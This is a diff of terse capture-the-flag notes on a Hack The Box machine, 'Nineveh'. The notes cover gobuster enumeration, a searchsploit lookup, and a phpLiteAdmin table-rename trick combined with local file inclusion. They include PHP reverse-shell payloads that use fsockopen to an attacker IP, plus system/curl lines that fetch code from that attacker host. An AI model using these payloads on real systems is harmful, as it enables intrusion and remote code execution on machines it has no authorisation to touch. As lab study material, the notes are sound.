@@ -1,5 +1,3 @@
-
-
 gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.43 -o http-output.txt
 
 Ignore SSL error:
@@ -33,7 +31,7 @@ root@kali:~/HTB/Nineveh# searchsploit -x 24044.txt
 Then make reverse shells(shells.txt):
 '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");' --->
 <?php $sock=fsockopen("10.10.14.11",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>
-
+----------------------------------------------------------------------------------------------------
 Creating new table: 'ninevehNotes' Field=1
 
 Direct wget php command:
@@ -42,3 +40,25 @@ Direct wget php command:
 Rename table:
 Table 'ninevehNotes' has been renamed to '/var/tmp/ninevehNotes.txt'.
 ALTER TABLE "ninevehNotes" RENAME TO '/var/tmp/ninevehNotes.php'
+----------------------------------------------------------------------------------------------------
+PoC first:
+<?php phpinfo()?>
+On:
+http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.txt.shell.php
+
+No "http://", then
+<?php system("curl 10.10.14.11/shell.txt"); ?>
+
+
+Try: 
+<?php system("curl 10.10.14.11/shell.txt" -O /var/tmp/nineveNotes12.php"); ?>
+
+
+
+
+
+
+
+
+
+
